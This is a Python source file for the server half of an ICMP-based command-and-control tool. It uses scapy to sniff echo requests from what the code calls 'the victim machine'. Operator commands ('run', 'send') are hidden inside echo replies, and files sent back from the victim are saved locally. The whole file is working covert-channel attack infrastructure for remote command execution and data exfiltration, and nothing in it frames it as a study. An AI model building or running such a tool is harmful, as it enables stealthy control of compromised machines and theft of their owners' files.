import configparser
import sys
import signal
import os
import threading
import time

# Third-Party imports
from scapy.all import *

# Configuration file path
CONFIG_PATH = "/home/server/Desktop/config.ini"


class Server:
    """Server class to communicate with the victim machine using ICMP messages. """
    
    # Constants
    ECHO_REPLY = "echo-reply"
    UTF_8 = "utf-8"
    ASCII = "ascii"
    ICMP_REQUEST = "icmp[0]=8"
    
    def __init__(self):
        """Initialize the server with command and file lists, and load configurations."""
        self.command_list = []
        self.files_list = []
        self.last_recieved_hello_time = time.time() 
        self.interface, self.file_dst_path = self.load_config()
        
    def load_config(self):
        """Load configuration from the config file.
        Returns:
            tuple: Containing the interface name and file destination path.
        """
        config = configparser.ConfigParser()
        config.read(CONFIG_PATH)
    
        expected_keys = {'interface', 'file_dst_path'}
        config_keys = set(config['DEFAULT'].keys())
        if config_keys != expected_keys:
            raise ValueError("config.ini contains unexpected parameters")

        interface = config.get('DEFAULT', 'interface')
        file_dst_path = config.get('DEFAULT', 'file_dst_path')

        # Validate configurations
        if not self.is_valid_interface(interface):
            raise ValueError(f"Invalid interface: {interface}")
        if not self.is_valid_path(file_dst_path):
            raise ValueError(f"Invalid path: {file_dst_path}")

        return interface, file_dst_path

    @staticmethod
    def is_valid_path(path):
        """Check if a path is valid. Return True if the path exists, False otherwise."""
        normalized_path = os.path.normpath(path)
        return os.path.exists(normalized_path)
    
    @staticmethod
    def is_valid_interface(interface):
        """Check if a network interface is valid. Return True if the interface exists, False otherwise."""
        try:
            available_interfaces = os.popen('ip link show').read()
            return interface in available_interfaces
        except OSError:
            return False
    
    @staticmethod
    def signal_handler(sig, frame):
        """Terminate the application upon receiving a system signal."""
        sys.exit(0)
    
    def send_packet(self, payload, pkt):
        """Send an ICMP packet with specified payload to the victim."""
        send(IP(dst=pkt[IP].src)/ICMP(type=self.ECHO_REPLY, id=pkt[ICMP].id)/payload, verbose=False)
    
    def check_command_validity(self, command):
        """Check if a command is valid. Returns True if valid, False otherwise."""
        if not command.startswith("run") and not command.startswith("send"):
            print("invalid command. please try again.")
            return False
        return True

    def get_command(self):
        """Continuously get commands from the user."""
        while True:
            command = input("please enter a command: ").strip()
            if self.check_command_validity(command):
                self.command_list.append(command)
            if command.startswith("send"):
                self.files_list.append(command[5:])
                
    def receive_file(self, file_name, payload):
        """Receive and save a file from the victim machine."""
        with open(self.file_dst_path + file_name, "ab") as current_file:
            current_file.write(payload[len(file_name):])

    def handle_pkt(self, pkt):
        """Process incoming packets and handle their payloads."""
        try:
            payload = pkt[0][Raw].load  
        except Exception as e:
            raise Exception(f"Error in parsing packet: {e}")

        if payload == b'hey server, i\'m available':
            self.last_recieved_hello_time = time.time()
            for command in self.command_list:
                self.send_packet(command, pkt)
            self.command_list = []
        else:
            found_filename = next((filename for filename in self.files_list if payload.startswith(filename.encode(Server.ASCII))), None)
            if found_filename:
                self.receive_file(found_filename, payload)
                self.files_list.remove(found_filename)
            else:
                print(payload.decode(self.UTF_8))
                
    def monitor_hello(self):
        """Monitor hello signals from the victim and print a warning if not received."""
        while True:
            current_time = time.time()
            if current_time - self.last_recieved_hello_time > 30:
                print("WARNING: The victim has disappeared!")
            time.sleep(1)
            
    def sniff_and_process(self):
        """Continuously sniff incoming packets and process them."""
        sniff(iface=self.interface, filter=Server.ICMP_REQUEST, prn=self.handle_pkt, store=0)

    def start(self):
        """Start the server's main functions in separate threads."""
        signal.signal(signal.SIGINT, self.signal_handler)

        commands_thread = threading.Thread(target=self.get_command)
        sniff_thread = threading.Thread(target=self.sniff_and_process)
        monitor_thread = threading.Thread(target=self.monitor_hello)

        commands_thread.start()
        sniff_thread.start()
        monitor_thread.start()

        commands_thread.join()
        sniff_thread.join()
        monitor_thread.join()
        

if __name__ == "__main__":
    server = Server()
    server.start()
